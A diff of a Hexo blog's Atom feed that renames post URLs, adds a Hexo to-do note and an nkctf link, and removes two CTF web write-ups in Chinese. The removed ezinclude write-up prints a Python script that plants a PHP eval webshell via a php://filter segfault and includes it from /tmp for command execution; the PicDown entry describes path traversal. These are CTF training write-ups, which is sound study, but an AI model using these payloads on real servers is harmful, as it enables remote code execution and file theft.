@@ -6,7 +6,7 @@
   <link href="http://van0308.github.io/atom.xml" rel="self"/>
   
   <link href="http://van0308.github.io/"/>
-  <updated>2023-03-23T13:17:55.686Z</updated>
+  <updated>2023-03-29T08:16:03.769Z</updated>
   <id>http://van0308.github.io/</id>
   
   <author>
@@ -17,9 +17,52 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>hexotodo</title>
+    <link href="http://van0308.github.io/2023/03/hexo/hexotodo/"/>
+    <id>http://van0308.github.io/2023/03/hexo/hexotodo/</id>
+    <published>2023-03-29T08:06:51.000Z</published>
+    <updated>2023-03-29T08:16:03.769Z</updated>
+    
+    <content type="html"><![CDATA[<p>指定文件夹下面生成文件</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># hexo new post &lt;title&gt;</span><br><span class="line"></span><br><span class="line"># -p 参数可以指定文章的路径</span><br><span class="line">hexo new post -p hello/hello-world # 注意里面的title为post</span><br><span class="line"></span><br><span class="line"># 此时里面的title为hello-world</span><br><span class="line"># hexo new post title -p dir/filename</span><br><span class="line">hexo new post hello-world -p hello/hello-world</span><br><span class="line"></span><br><span class="line">## 当然了手动将文章放到指定的文件夹中也可以</span><br></pre></td></tr></table></figure></blockquote><p>吸顶，状态栏</p><p>导航栏下拉列表</p><p>每篇博客的访问量</p><p>图标问题，图片显示问题</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;指定文件夹下面生成文件&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span </summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>nkctf 2023</title>
+    <link href="http://van0308.github.io/2023/03/%E7%AB%9E%E8%B5%9B/nkctf-2023/"/>
+    <id>http://van0308.github.io/2023/03/%E7%AB%9E%E8%B5%9B/nkctf-2023/</id>
+    <published>2023-03-28T14:33:06.000Z</published>
+    <updated>2023-03-29T07:29:13.094Z</updated>
+    
+    <content type="html"><![CDATA[<p>官方wp</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247484528&idx=1&sn=b2a03a4dc4cb6698be66ade248dfe535&chksm=cf5ee426f8296d3027567dcfa8bc20289752af8339925031fe44ef2f951897f0f98e00da6e54&mpshare=1&scene=23&srcid=0328nFGv1Tvj8qAOHKbgbIKQ&sharer_sharetime=1680007285512&sharer_shareid=2643fa15f41e985b074e9d1a10adbca5#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247484528&amp;idx=1&amp;sn=b2a03a4dc4cb6698be66ade248dfe535&amp;chksm=cf5ee426f8296d3027567dcfa8bc20289752af8339925031fe44ef2f951897f0f98e00da6e54&amp;mpshare=1&amp;scene=23&amp;srcid=0328nFGv1Tvj8qAOHKbgbIKQ&amp;sharer_sharetime=1680007285512&amp;sharer_shareid=2643fa15f41e985b074e9d1a10adbca5#rd</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;官方wp&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247484528&amp;idx=1&amp;sn=b2a03a4dc4cb6698be66ade248dfe535&amp;chksm=cf5</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>picoCTF2023</title>
-    <link href="http://van0308.github.io/2023/03/23/picoCTF2023/"/>
-    <id>http://van0308.github.io/2023/03/23/picoCTF2023/</id>
+    <link href="http://van0308.github.io/2023/03/%E7%AB%9E%E8%B5%9B/picoCTF2023/"/>
+    <id>http://van0308.github.io/2023/03/%E7%AB%9E%E8%B5%9B/picoCTF2023/</id>
     <published>2023-03-23T13:09:37.000Z</published>
     <updated>2023-03-23T13:17:55.686Z</updated>
     
@@ -41,8 +84,8 @@
   
   <entry>
     <title>VNCTF 2023</title>
-    <link href="http://van0308.github.io/2023/03/01/VNCTF-2023/"/>
-    <id>http://van0308.github.io/2023/03/01/VNCTF-2023/</id>
+    <link href="http://van0308.github.io/2023/03/%E7%AB%9E%E8%B5%9B/VNCTF-2023/"/>
+    <id>http://van0308.github.io/2023/03/%E7%AB%9E%E8%B5%9B/VNCTF-2023/</id>
     <published>2023-03-01T05:54:53.000Z</published>
     <updated>2023-03-01T06:03:09.502Z</updated>
     
@@ -63,8 +106,8 @@
   
   <entry>
     <title>hscctf 2023</title>
-    <link href="http://van0308.github.io/2023/02/26/hscctf-2023/"/>
-    <id>http://van0308.github.io/2023/02/26/hscctf-2023/</id>
+    <link href="http://van0308.github.io/2023/02/%E7%AB%9E%E8%B5%9B/hscctf-2023/"/>
+    <id>http://van0308.github.io/2023/02/%E7%AB%9E%E8%B5%9B/hscctf-2023/</id>
     <published>2023-02-26T09:02:14.000Z</published>
     <updated>2023-03-01T05:53:42.057Z</updated>
     
@@ -85,8 +128,8 @@
   
   <entry>
     <title>[GYCTF2020]EasyThinking</title>
-    <link href="http://van0308.github.io/2023/02/25/GYCTF2020-EasyThinking/"/>
-    <id>http://van0308.github.io/2023/02/25/GYCTF2020-EasyThinking/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/GYCTF2020-EasyThinking/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/GYCTF2020-EasyThinking/</id>
     <published>2023-02-25T08:51:21.000Z</published>
     <updated>2023-02-26T07:28:54.679Z</updated>
     
@@ -109,8 +152,8 @@
   
   <entry>
     <title>网鼎杯2018]Unfinish</title>
-    <link href="http://van0308.github.io/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"/>
-    <id>http://van0308.github.io/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/</id>
     <published>2023-02-14T14:34:52.000Z</published>
     <updated>2023-02-26T07:48:39.863Z</updated>
     
@@ -135,8 +178,8 @@
   
   <entry>
     <title>CISCN2019 华东南赛区]Double Secret</title>
-    <link href="http://van0308.github.io/2023/02/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
-    <id>http://van0308.github.io/2023/02/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</id>
     <published>2023-02-14T14:29:34.000Z</published>
     <updated>2023-02-21T01:30:09.027Z</updated>
     
@@ -161,35 +204,9 @@
   </entry>
   
   <entry>
-    <title>[NPUCTF2020]ezinclude</title>
-    <link href="http://van0308.github.io/2023/02/14/NPUCTF2020-ezinclude/"/>
-    <id>http://van0308.github.io/2023/02/14/NPUCTF2020-ezinclude/</id>
-    <published>2023-02-14T12:13:44.000Z</published>
-    <updated>2023-02-15T13:16:23.031Z</updated>
-    
-    <content type="html"><![CDATA[<p>做题：</p><p>打开直接提示用户名密码错误，看源代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">抓包发现有cookie是Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class="line">放包看响应有Set-Cookie: Hash=576322dd496b99d07b5b0f7fa7934a25;</span><br><span class="line">尝试传几个不同的name，发现hash随之改变</span><br><span class="line">猜测hash值就是md5后的结果</span><br><span class="line">传?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25</span><br><span class="line">发现</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;flflflflag.php&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">直接访问会跳转到404，则还是抓包</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">include($_GET[&quot;file&quot;])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>文件包含，那么可以试试读取源码:（也可以试读取其他文件，但是试了找不到flag）</p><p>flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flflflflag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@<span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@<span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;Hash&quot;</span>,<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>),<span class="title function_ invoke__">time</span>()+<span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret</span>=<span class="string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看不出什么端倪，那就应该还有其他文件，扫一下，发现有个老六dir.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>dir.php可以打印&#x2F;tmp下的内容，所以想方法将文件搞到tmp下</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="法一利用PHP7版本漏洞-segment-fault特性"><a href="#法一利用PHP7版本漏洞-segment-fault特性" class="headerlink" title="法一利用PHP7版本漏洞 segment fault特性"></a>法一利用PHP7版本漏洞 segment fault特性</h4><p>原理参考：</p><p><a href="https://blog.csdn.net/weixin_45646006/article/details/120817553">https://blog.csdn.net/weixin_45646006/article/details/120817553</a></p><p>大概就是php:&#x2F;&#x2F;filter&#x2F;的过滤器strip_tags,存在漏洞可以让PHP执行时候出现segment fault，则此时上传文件会保存在缓存目录下，不会被垃圾回收机制清除。</p><p>默认是&#x2F;tmp目录下。只需要php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;xxx文件，同时再上传一个文件上去，就可以触发利用。</p><h5 id="过程与脚本"><a href="#过程与脚本" class="headerlink" title="过程与脚本"></a>过程与脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://93678a40-98db-4f30-ac85-4d6f0820e597.node4.buuoj.cn:81/\</span></span><br><span class="line"><span class="string">flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">file_data = &#123;<span class="string">&quot;file&quot;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">res = requests.post(url=url,files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>运行后访问dir.php得到文件名，然后POST &#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpAJEMpx包含文件执行命令cmd&#x3D;phpinfo();flag就在里面。</p><p>PS：我试的时候，get和直接写入phpinfo都可以，但是写post就不行。不明所以。</p><p>而且get的时候flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpAJEMpx&amp;cmd&#x3D;echo%20system(‘whoami’);没有回显</p><p>&#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpAJEMpx&amp;cmd&#x3D;echo%201;有回显。说明ban了一些东西。</p><p>可以用蚁剑连上去，然后用插件disable_function绕过就行了。（见之前文章）</p><h4 id="法二-利用-session-upload-progress-进行-session-文件包含"><a href="#法二-利用-session-upload-progress-进行-session-文件包含" class="headerlink" title="法二 利用 session.upload_progress 进行 session 文件包含"></a>法二 利用 session.upload_progress 进行 session 文件包含</h4><p>（坑）这个牵扯出东西有点多，先挖个坑</p><p><a href="https://syunaht.com/p/2193317358.html">https://syunaht.com/p/2193317358.html</a></p><p><a href="https://www.cnblogs.com/R3col/p/14929237.html">https://www.cnblogs.com/R3col/p/14929237.html</a></p><p><a href="https://fanygit.github.io/2021/10/18/[NPUCTF2020]ezinclude%201/">https://fanygit.github.io/2021/10/18/[NPUCTF2020]ezinclude%201/</a></p><p><a href="https://www.shawroot.cc/%e7%95%99%e8%a8%80%e6%9d%bf">https://www.shawroot.cc/%e7%95%99%e8%a8%80%e6%9d%bf</a></p><p><a href="http://www.snowywar.top/">http://www.snowywar.top/</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/114656092">https://blog.csdn.net/rfrder/article/details/114656092</a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/14826360.html">https://www.cnblogs.com/Article-kelp/p/14826360.html</a></p><p><a href="https://blog.csdn.net/weixin_45646006/article/details/120817553">https://blog.csdn.net/weixin_45646006/article/details/120817553</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;做题：&lt;/p&gt;
-&lt;p&gt;打开直接提示用户名密码错误，看源代码。&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;</summary>
-      
-    
-    
-    
-    
-    <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
-    
-    <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
-    
-  </entry>
-  
-  <entry>
     <title>[NCTF2019]SQLi</title>
-    <link href="http://van0308.github.io/2023/02/14/NCTF2019-SQLi/"/>
-    <id>http://van0308.github.io/2023/02/14/NCTF2019-SQLi/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/NCTF2019-SQLi/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/NCTF2019-SQLi/</id>
     <published>2023-02-14T10:01:20.000Z</published>
     <updated>2023-02-21T10:34:11.726Z</updated>
     
@@ -206,16 +223,16 @@
     
     <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
     
-    <category term="sql" scheme="http://van0308.github.io/tags/sql/"/>
-    
     <category term="坑" scheme="http://van0308.github.io/tags/%E5%9D%91/"/>
+    
+    <category term="sql" scheme="http://van0308.github.io/tags/sql/"/>
     
   </entry>
   
   <entry>
     <title>[网鼎杯 2018]Comment</title>
-    <link href="http://van0308.github.io/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"/>
-    <id>http://van0308.github.io/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/</id>
     <published>2023-02-14T09:15:58.000Z</published>
     <updated>2023-02-26T03:45:52.043Z</updated>
     
@@ -241,8 +258,8 @@
   
   <entry>
     <title>[SWPUCTF 2018]SimplePHP</title>
-    <link href="http://van0308.github.io/2023/02/14/SWPUCTF-2018-SimplePHP/"/>
-    <id>http://van0308.github.io/2023/02/14/SWPUCTF-2018-SimplePHP/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/SWPUCTF-2018-SimplePHP/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/SWPUCTF-2018-SimplePHP/</id>
     <published>2023-02-14T09:08:22.000Z</published>
     <updated>2023-02-24T13:42:31.689Z</updated>
     
@@ -265,8 +282,8 @@
   
   <entry>
     <title>GYCTF2020]Ezsqli</title>
-    <link href="http://van0308.github.io/2023/02/14/GYCTF2020-Ezsqli/"/>
-    <id>http://van0308.github.io/2023/02/14/GYCTF2020-Ezsqli/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/GYCTF2020-Ezsqli/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/GYCTF2020-Ezsqli/</id>
     <published>2023-02-14T08:35:29.000Z</published>
     <updated>2023-02-21T10:31:31.649Z</updated>
     
@@ -290,8 +307,8 @@
   
   <entry>
     <title>HFCTF2020]EasyLogin</title>
-    <link href="http://van0308.github.io/2023/02/14/HFCTF2020-EasyLogin/"/>
-    <id>http://van0308.github.io/2023/02/14/HFCTF2020-EasyLogin/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/HFCTF2020-EasyLogin/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/HFCTF2020-EasyLogin/</id>
     <published>2023-02-14T08:00:46.000Z</published>
     <updated>2023-02-17T09:35:25.622Z</updated>
     
@@ -317,8 +334,8 @@
   
   <entry>
     <title>CISCN2019 总决赛 Day2 Web1]Easyweb</title>
-    <link href="http://van0308.github.io/2023/02/14/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/"/>
-    <id>http://van0308.github.io/2023/02/14/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/</id>
     <published>2023-02-14T07:07:11.000Z</published>
     <updated>2023-02-21T02:26:34.502Z</updated>
     
@@ -341,8 +358,8 @@
   
   <entry>
     <title>[HITCON 2017]SSRFme</title>
-    <link href="http://van0308.github.io/2023/02/13/HITCON-2017-SSRFme/"/>
-    <id>http://van0308.github.io/2023/02/13/HITCON-2017-SSRFme/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/HITCON-2017-SSRFme/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/HITCON-2017-SSRFme/</id>
     <published>2023-02-13T14:49:41.000Z</published>
     <updated>2023-02-20T15:28:12.471Z</updated>
     
@@ -366,8 +383,8 @@
   
   <entry>
     <title>hgame2023</title>
-    <link href="http://van0308.github.io/2023/02/13/hgame2023/"/>
-    <id>http://van0308.github.io/2023/02/13/hgame2023/</id>
+    <link href="http://van0308.github.io/2023/02/%E7%AB%9E%E8%B5%9B/hgame2023/"/>
+    <id>http://van0308.github.io/2023/02/%E7%AB%9E%E8%B5%9B/hgame2023/</id>
     <published>2023-02-13T02:57:10.000Z</published>
     <updated>2023-03-05T04:38:39.956Z</updated>
     
@@ -387,8 +404,8 @@
   
   <entry>
     <title>[RootersCTF2019]I_&lt;3_Flask</title>
-    <link href="http://van0308.github.io/2023/02/11/RootersCTF2019-I-3-Flask/"/>
-    <id>http://van0308.github.io/2023/02/11/RootersCTF2019-I-3-Flask/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/RootersCTF2019-I-3-Flask/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/RootersCTF2019-I-3-Flask/</id>
     <published>2023-02-11T11:16:11.000Z</published>
     <updated>2023-02-26T07:45:20.550Z</updated>
     
@@ -415,8 +432,8 @@
   
   <entry>
     <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
-    <link href="http://van0308.github.io/2023/02/11/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/"/>
-    <id>http://van0308.github.io/2023/02/11/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/</id>
     <published>2023-02-11T08:57:54.000Z</published>
     <updated>2023-02-22T13:05:28.762Z</updated>
     
@@ -439,8 +456,8 @@
   
   <entry>
     <title>[RCTF2015]EasySQL</title>
-    <link href="http://van0308.github.io/2023/02/11/RCTF2015-EasySQL/"/>
-    <id>http://van0308.github.io/2023/02/11/RCTF2015-EasySQL/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/RCTF2015-EasySQL/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/RCTF2015-EasySQL/</id>
     <published>2023-02-11T07:58:38.000Z</published>
     <updated>2023-02-22T07:56:56.786Z</updated>
     
@@ -469,8 +486,8 @@
   
   <entry>
     <title>[红明谷CTF 2021]write_shell</title>
-    <link href="http://van0308.github.io/2023/02/10/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/"/>
-    <id>http://van0308.github.io/2023/02/10/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/</id>
+    <link href="http://van0308.github.io/2023/02/buu_web/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/"/>
+    <id>http://van0308.github.io/2023/02/buu_web/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/</id>
     <published>2023-02-10T13:20:20.000Z</published>
     <updated>2023-02-10T14:38:29.723Z</updated>
     
@@ -486,31 +503,6 @@
     
     
     <category term="buu" scheme="http://van0308.github.io/tags/buu/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[网鼎杯 2020 白虎组]PicDown</title>
-    <link href="http://van0308.github.io/2023/02/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"/>
-    <id>http://van0308.github.io/2023/02/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/</id>
-    <published>2023-02-10T12:57:59.000Z</published>
-    <updated>2023-02-11T07:39:03.397Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>进入就是一个输入框，搜集信息啥也没有。输入之后url会有 ?url&#x3D;</p><p>一般这种就是路径遍历，ssrf，或者文件包含，PHP伪协议php:&#x2F;&#x2F;filter,file:&#x2F;&#x2F;,或者?file&#x3D;<a href="http://127.0.0.1/admin.php%E7%AD%89%E7%AD%89">http://127.0.0.1/admin.php等等</a></p><p>试一下路径遍历，发现下载了几个文件，不过仔细看大小不同。用记事本打开，知道与自己的遍历的内容有关。题目可以直接..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag找到 据说是平台环境问题，正式比赛flag不在这里。</p><p><img src="C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230210210219477.png" alt="image-20230210210219477"></p><p>用抓包的话，不会下载文件，而是直接可以看出内容</p><h4 id="正规解法"><a href="#正规解法" class="headerlink" title="正规解法"></a>正规解法</h4><blockquote><p>我们都知道可以通过&#x2F;proc&#x2F;$pid&#x2F;来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问&#x2F;proc&#x2F;$pid&#x2F;目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了&#x2F;proc&#x2F;self&#x2F;目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于&#x2F;proc&#x2F;本进程pid&#x2F;。进程可以通过访问&#x2F;proc&#x2F;self&#x2F;目录来获取自己的系统信息，而不用每次都获取pid</p></blockquote><p>即proc&#x2F;具体pid&#x2F;目录和proc&#x2F;self&#x2F;目录 基本等价</p><blockquote><p>fd是一个目录，里面包含着<strong>当前进程打开的每一个文件</strong>的描述符（file 